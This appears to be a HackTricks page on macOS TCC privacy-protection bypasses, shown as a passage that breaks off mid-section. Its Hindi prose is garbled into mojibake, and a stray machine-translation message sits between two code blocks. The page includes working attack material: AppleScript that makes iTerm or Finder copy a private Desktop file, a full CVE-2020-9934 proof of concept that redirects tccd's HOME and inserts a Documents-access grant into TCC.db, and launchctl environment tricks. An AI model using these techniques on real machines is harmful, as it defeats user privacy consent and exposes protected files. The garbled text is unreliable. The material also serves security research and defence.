# macOS TCC рдмрд╛рдпрдкрд╛рд╕

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ.

</details>

## рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рджреНрд╡рд╛рд░рд╛

### Write Bypass

рдпрд╣ рдПрдХ рдмрд╛рдпрдкрд╛рд╕ рдирд╣реАрдВ рд╣реИ, рдпрд╣ рд╕рд┐рд░реНрдл TCC рдХрд╛ рдХрд╛рдордХрд╛рдЬ рд╣реИ: **рдпрд╣ рд▓рд┐рдЦрдиреЗ рд╕реЗ рдирд╣реАрдВ рдмрдЪрд╛рддрд╛**. рдЕрдЧрд░ Terminal рдХреЛ рдпреВрдЬрд░ рдХреЗ Desktop рдХреЛ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ, рддреЛ рднреА рд╡рд╣ рдЗрд╕рдореЗрдВ рд▓рд┐рдЦ рд╕рдХрддрд╛ рд╣реИ:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
рдирдИ **рдлрд╝рд╛рдЗрд▓** рдореЗрдВ **рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рд╡рд┐рд╢реЗрд╖рддрд╛ `com.apple.macl`** рдЬреЛрдбрд╝реА рдЬрд╛рддреА рд╣реИ рддрд╛рдХрд┐ **рдирд┐рд░реНрдорд╛рддрд╛ рдРрдк** рдХреЛ рдЗрд╕реЗ рдкрдврд╝рдиреЗ рдХреА рдкрд╣реБрдВрдЪ рдорд┐рд▓ рд╕рдХреЗред

### SSH рдмрд╛рдпрдкрд╛рд╕

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ **SSH рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╣реБрдВрдЪ "рдкреВрд░реНрдг рдбрд┐рд╕реНрдХ рдкрд╣реБрдВрдЪ"** рдХреЗ рд╕рд╛рде рд╣реЛрддреА рдереАред рдЗрд╕реЗ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдЗрд╕реЗ рд╕реВрдЪреАрдмрджреНрдз рдХрд░рдиреЗ рдХреА рдЬрд░реВрд░рдд рд╣реИ рд▓реЗрдХрд┐рди рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░рдирд╛ рд╣реЛрдЧрд╛ (рдЗрд╕реЗ рд╕реВрдЪреА рд╕реЗ рд╣рдЯрд╛рдиреЗ рд╕реЗ рдЙрди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рд╣рдЯрд╛рдпрд╛ рдирд╣реАрдВ рдЬрд╛рдПрдЧрд╛):

![](<../../../../../.gitbook/assets/image (569).png>)

рдпрд╣рд╛рдВ рдЖрдкрдХреЛ рдЙрджрд╛рд╣рд░рдг рдорд┐рд▓реЗрдВрдЧреЗ рдХрд┐ рдХреИрд╕реЗ рдХреБрдЫ **рдореИрд▓рд╡реЗрдпрд░ рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реБрдП рд╣реИрдВ**:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЕрдм, SSH рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **рдкреВрд░реНрдг рдбрд┐рд╕реНрдХ рдкрд╣реБрдВрдЪ** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ
{% endhint %}

### рд╣реИрдВрдбрд▓ рдПрдХреНрд╕рдЯреЗрдВрд╢рдиреНрд╕ - CVE-2022-26767

**`com.apple.macl`** рд╡рд┐рд╢реЗрд╖рддрд╛ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рджреА рдЬрд╛рддреА рд╣реИ рддрд╛рдХрд┐ **рдХрд┐рд╕реА рд╡рд┐рд╢реЗрд╖ рдРрдк рдХреЛ рдЗрд╕реЗ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓ рд╕рдХреЗред** рдпрд╣ рд╡рд┐рд╢реЗрд╖рддрд╛ рддрдм рд╕реЗрдЯ рдХреА рдЬрд╛рддреА рд╣реИ рдЬрдм рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдРрдк рдкрд░ **рдбреНрд░реИрдЧ рдПрдВрдб рдбреНрд░реЙрдк** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдпрд╛ рдЬрдм рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдлрд╝рд╛рдЗрд▓ рдХреЛ **рдбрдмрд▓-рдХреНрд▓рд┐рдХ** рдХрд░рдХреЗ рдЗрд╕реЗ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдРрдк** рдХреЗ рд╕рд╛рде рдЦреЛрд▓рддрд╛ рд╣реИред

рдЗрд╕рд▓рд┐рдП, рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдПрдХ рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдРрдк рдХреЛ рд░рдЬрд┐рд╕реНрдЯрд░** рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рд╕рднреА рдПрдХреНрд╕рдЯреЗрдВрд╢рдиреНрд╕ рдХреЛ рд╣реИрдВрдбрд▓ рдХрд░реЗ рдФрд░ рд▓реЙрдиреНрдЪ рд╕рд░реНрд╡рд┐рд╕реЗрдЬ рдХреЛ рдХреЙрд▓ рдХрд░рдХреЗ рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдХреЛ **рдЦреЛрд▓рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд╣ рд╕рдХрддрд╛ рд╣реИ (рдЗрд╕рд▓рд┐рдП рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкрдврд╝рдиреЗ рдХреА рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рдПрдЧреА)ред

### iCloud

рдПрдВрдЯрд╛рдЗрдЯрд▓рдореЗрдВрдЯ **`com.apple.private.icloud-account-access`** рдХреЗ рд╕рд╛рде рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **`com.apple.iCloudHelper`** XPC рд╕реЗрд╡рд╛ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдЬреЛ **iCloud рдЯреЛрдХрди рдкреНрд░рджрд╛рди рдХрд░реЗрдЧреА**ред

**iMovie** рдФрд░ **Garageband** рдореЗрдВ рдпрд╣ рдПрдВрдЯрд╛рдЗрдЯрд▓рдореЗрдВрдЯ рдФрд░ рдЕрдиреНрдп рдереЗ рдЬреЛ рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рдереЗред

рдЙрд╕ рдПрдВрдЯрд╛рдЗрдЯрд▓рдореЗрдВрдЯ рд╕реЗ **iCloud рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХ **рдЬрд╛рдирдХрд╛рд░реА** рдХреЗ рд▓рд┐рдП рдЯреЙрдХ рджреЗрдЦреЗрдВ: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓рд╛ рдПрдХ рдРрдк рдЕрдиреНрдп рдРрдкреНрд╕ рдХреЛ **рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ** рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдпрд╣ рдЕрдиреНрдп рдРрдкреНрд╕ рдХреЛ рджреА рдЧрдИ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ **рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред

Apple Scripts рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЕрдЧрд░ рдПрдХ рдРрдк рдХреЗ рдкрд╛рд╕ **`iTerm` рдкрд░ Automation рдЕрдиреБрдорддрд┐ рд╣реИ**, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ **`Terminal`** рдХреЗ рдкрд╛рд╕ iTerm рдкрд░ рдкрд╣реБрдВрдЪ рд╣реИ:

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### iTerm рдкрд░

Terminal, рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ FDA рдирд╣реАрдВ рд╣реИ, iTerm рдХреЛ рдХреЙрд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ рдпрд╣ рд╣реИ, рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддрд╛ рд╣реИ:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
Since the provided text does not contain any content to translate, there is nothing to translate. Please provide the relevant English text that needs to be translated into Hindi.
```bash
osascript iterm.script
```
#### рдлрд╛рдЗрдВрдбрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрд╛ рдпрджрд┐ рдХрд┐рд╕реА рдРрдк рдХреЛ рдлрд╛рдЗрдВрдбрд░ рдкрд░ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рд╣реЛ, рддреЛ рд╡рд╣ рдЗрд╕ рддрд░рд╣ рдХреА рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## рдРрдк рд╡реНрдпрд╡рд╣рд╛рд░ рджреНрд╡рд╛рд░рд╛

### CVE-2020тАУ9934 - TCC <a href="#c19b" id="c19b"></a>

рдпреВрдЬрд░рд▓реИрдВрдб **tccd daemon** **`HOME`** **env** рд╡реЗрд░рд┐рдПрдмрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ TCC рдпреВрдЬрд░реНрд╕ рдбреЗрдЯрд╛рдмреЗрд╕ рддрдХ рдкрд╣реБрдБрдЪ рд░рд╣рд╛ рдерд╛: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[рдЗрд╕ Stack Exchange рдкреЛрд╕реНрдЯ](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдФрд░ рдЪреВрдВрдХрд┐ TCC рдбреЗрдореЙрди `launchd` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рд░реНрддрдорд╛рди рдпреВрдЬрд░ рдХреЗ рдбреЛрдореЗрди рдореЗрдВ рдЪрд▓ рд░рд╣рд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрд╕реЗ рдкрд╛рд╕ рдХрд┐рдП рдЧрдП **рд╕рднреА рдПрдирд╡рд╛рдпрд░рдирдореЗрдВрдЯ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ**ред\
рдЗрд╕ рдкреНрд░рдХрд╛рд░, рдПрдХ **рд╣рдорд▓рд╛рд╡рд░ `$HOME` рдПрдирд╡рд╛рдпрд░рдирдореЗрдВрдЯ** рд╡реЗрд░рд┐рдПрдмрд▓ рдХреЛ **`launchctl`** рдореЗрдВ рд╕реЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд╣ рдПрдХ **рдирд┐рдпрдВрддреНрд░рд┐рдд рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА** рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░реЗ, **TCC** рдбреЗрдореЙрди рдХреЛ **рдкреБрдирдГ рд╕реНрдЯрд╛рд░реНрдЯ** рдХрд░реЗ, рдФрд░ рдлрд┐рд░ **рд╕реАрдзреЗ TCC рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдореЙрдбрд┐рдлрд╛рдИ рдХрд░реЗ** рддрд╛рдХрд┐ рд╡рд╣ рдЦреБрдж рдХреЛ **рд╣рд░ TCC рдПрдВрдЯрд╛рдЗрдЯрд▓рдореЗрдВрдЯ рдЙрдкрд▓рдмреНрдз рдХрд░рд╛ рд╕рдХреЗ** рдмрд┐рдирд╛ рдХрднреА рдЕрдВрддрд┐рдо рдпреВрдЬрд░ рдХреЛ рдкреНрд░реЙрдореНрдкреНрдЯ рдХрд┐рдПред\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - рдиреЛрдЯреНрд╕

рдиреЛрдЯреНрд╕ рдХреЛ TCC рд╕рдВрд░рдХреНрд╖рд┐рдд рд╕реНрдерд╛рдиреЛрдВ рддрдХ рдкрд╣реБрдБрдЪ рдереА рд▓реЗрдХрд┐рди рдЬрдм рдПрдХ рдиреЛрдЯ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдпрд╣ **рдПрдХ рдЧреИрд░-рд╕рдВрд░рдХреНрд╖рд┐рдд рд╕реНрдерд╛рди рдореЗрдВ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдЗрд╕рд▓рд┐рдП, рдЖрдк рдиреЛрдЯреНрд╕ рд╕реЗ рдХрд╣ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рд╡рд╣ рдПрдХ рд╕рдВрд░рдХреНрд╖рд┐рдд рдлрд╝рд╛рдЗрд▓ рдХреЛ рдПрдХ рдиреЛрдЯ рдореЗрдВ рдХреЙрдкреА рдХрд░реЗ (рдЗрд╕рд▓рд┐рдП рдПрдХ рдЧреИрд░-рд╕рдВрд░рдХреНрд╖рд┐рдд рд╕реНрдерд╛рди рдореЗрдВ) рдФрд░ рдлрд┐рд░ рдлрд╝рд╛рдЗрд▓ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ:

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (3).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - рдЯреНрд░рд╛рдВрд╕рд▓реЛрдХреЗрд╢рди

рдмрд╛рдЗрдирд░реА `/usr/libexec/lsd` рдЬрд┐рд╕рдореЗрдВ рд▓рд╛рдЗрдмреНрд░реЗрд░реА `libsecurity_translocate` рдереА, рдХреЛ рдПрдВрдЯрд╛рдЗрдЯрд▓рдореЗрдВрдЯ `com.apple.private.nullfs_allow` рдкреНрд░рд╛рдкреНрдд рдерд╛ рдЬрд┐рд╕рд╕реЗ рдпрд╣ **nullfs** рдорд╛рдЙрдВрдЯ рдмрдирд╛ рд╕рдХрддрд╛ рдерд╛ рдФрд░ рдЗрд╕реЗ `com.apple.private.tcc.allow` рдПрдВрдЯрд╛рдЗрдЯрд▓рдореЗрдВрдЯ рднреА рдкреНрд░рд╛рдкреНрдд рдерд╛ рдЬрд┐рд╕рдореЗрдВ **`kTCCServiceSystemPolicyAllFiles`** рдерд╛ рдЬрд┐рд╕рд╕реЗ рдпрд╣ рд╣рд░ рдлрд╝рд╛рдЗрд▓ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддрд╛ рдерд╛ред

"Library" рдХреЛ рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рдЬреЛрдбрд╝рдирд╛ рд╕рдВрднрд╡ рдерд╛, **`com.apple.security.translocation`** XPC рд╕реЗрд╡рд╛ рдХреЛ рдХреЙрд▓ рдХрд░рдирд╛ рдФрд░ рдлрд┐рд░ рдпрд╣ Library рдХреЛ **`$TMPDIR/AppTranslocation/d/d/Library`** рдореЗрдВ рдореИрдк рдХрд░ рджреЗрддрд╛ рдерд╛ рдЬрд╣рд╛рдБ Library рдХреЗ рдЕрдВрджрд░ рдХреЗ рд╕рднреА рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ **рдкрд╣реБрдБрдЪреЗ рдЬрд╛ рд╕рдХрддреЗ рдереЗ**ред

### CVE-2023-38571 - рдореНрдпреВрдЬрд╝рд┐рдХ рдФрд░ рдЯреАрд╡реА <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** рдореЗрдВ рдПрдХ рджрд┐рд▓рдЪрд╕реНрдк рдлреАрдЪрд░ рд╣реИ: рдЬрдм рдпрд╣ рдЪрд▓ рд░рд╣рд╛ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдпрд╣ **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** рдореЗрдВ рдбреНрд░реЙрдк рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ "рдореАрдбрд┐рдпрд╛ рд▓рд╛рдЗрдмреНрд░реЗрд░реА" рдореЗрдВ **рдЖрдпрд╛рдд** рдХрд░реЗрдЧрд╛ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрд╣ рдХреБрдЫ рдРрд╕рд╛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ: **`rename(a, b);`** рдЬрд╣рд╛рдБ `a` рдФрд░ `b` рд╣реИрдВ:

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

рдпрд╣ **`rename(a, b);`** рд╡реНрдпрд╡рд╣рд╛рд░ рдПрдХ **рд░реЗрд╕ рдХрдВрдбреАрд╢рди** рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ `Automatically Add to Music.localized` рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдПрдХ рдирдХрд▓реА **TCC.db** рдлрд╝рд╛рдЗрд▓ рдбрд╛рд▓рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдФрд░ рдлрд┐рд░ рдЬрдм рдирдпрд╛ рдлрд╝реЛрд▓реНрдбрд░(b) рдлрд╝рд╛рдЗрд▓ рдХреЛ рдХреЙрдкреА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЙрд╕реЗ рд╣рдЯрд╛ рджреЗрдВ, рдФрд░ рдЗрд╕реЗ **`~/Library/Application Support/com.apple.TCC`**/ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░реЗрдВред

### SQLITE_SQLLOG_DIR - CVE-2023-32422

рдЕрдЧрд░ **`SQLITE_SQLLOG_DIR="path/folder"`** рдореВрд▓ рд░реВрдк рд╕реЗ рдпрд╣ рдорддрд▓рдм рд╣реИ рдХрд┐ **рдХреЛрдИ рднреА рдЦреБрд▓рд╛ рдбреАрдмреА рдЙрд╕ рдкрде рдкрд░ рдХреЙрдкреА рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдЗрд╕ CVE рдореЗрдВ рдЗрд╕ рдирд┐рдпрдВрддреНрд░рдг рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдПрдХ **SQLite рдбреЗрдЯрд╛рдмреЗрд╕** рдХреЗ рдЕрдВрджрд░ **рд▓рд┐рдЦрдиреЗ** рдХреЗ рд▓рд┐рдП рдЬреЛ FDA рдХреЗ рд╕рд╛рде рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджреНрд╡рд╛рд░рд╛ **рдЦреЛрд▓рд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рд╣реИ TCC рдбреЗрдЯрд╛рдмреЗрд╕**, рдФрд░ рдлрд┐рд░ **`SQLITE_SQLLOG_DIR`** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛ рдПрдХ **рд╕рд┐рдореНрд▓рд┐рдВрдХ рдХреЗ рд╕рд╛рде рдлрд╝рд╛рдЗрд▓рдирд╛рдо рдореЗрдВ** рддрд╛рдХрд┐ рдЬрдм рд╡рд╣ рдбреЗрдЯрд╛рдмреЗрд╕ **рдЦреЛрд▓рд╛ рдЬрд╛рдП**, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **TCC.db рдХреЛ рдЦреЛрд▓реЗ рдЧрдП рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред\
**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА** [**рд▓реЗрдЦ рдореЗрдВ**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **рдФрд░**[ **рд╡рд╛рд░реНрддрд╛ рдореЗрдВ**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).

### **SQLITE_AUTO_TRACE**

рдЕрдЧрд░ рдкрд░реНрдпрд╛рд╡рд░рдг рд╡реЗрд░рд┐рдПрдмрд▓ **`SQLITE_AUTO_TRACE`** рд╕реЗрдЯ рд╣реИ, рддреЛ рд▓рд╛рдЗрдмреНрд░реЗрд░реА **`libsqlite3.dylib`** рд╕рднреА SQL рдХреНрд╡реЗрд░реАрдЬрд╝ рдХреА **рд▓реЙрдЧрд┐рдВрдЧ** рд╢реБрд░реВ рдХрд░ рджреЗрдЧреАред рдХрдИ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЗрд╕ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рдереЗ, рдЗрд╕рд▓рд┐рдП рдЙрдирдХреЗ рд╕рднреА SQLite рдХреНрд╡реЗрд░реАрдЬрд╝ рдХреЛ рд▓реЙрдЧ рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛ред

рдХрдИ Apple рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЗрд╕ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ TCC рд╕рдВрд░рдХреНрд╖рд┐рдд рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддреЗ рдереЗред
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

рдпрд╣ **env variable `Metal` framework рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИ** рдЬреЛ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░реЛрдЧреНрд░рд╛рдореНрд╕ рдХреЗ рд▓рд┐рдП рдПрдХ рдирд┐рд░реНрднрд░рддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ `Music`, рдЬрд┐рд╕рдореЗрдВ FDA рд╣реИред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реЗрдЯ рдХрд░рдирд╛: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`ред рдпрджрд┐ `path` рдПрдХ рдорд╛рдиреНрдп рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рд╣реИ, рддреЛ рдмрдЧ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрдЧрд╛ рдФрд░ рд╣рдо `fs_usage` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдореЗрдВ рдХреНрдпрд╛ рд╣реЛ рд░рд╣рд╛ рд╣реИ:

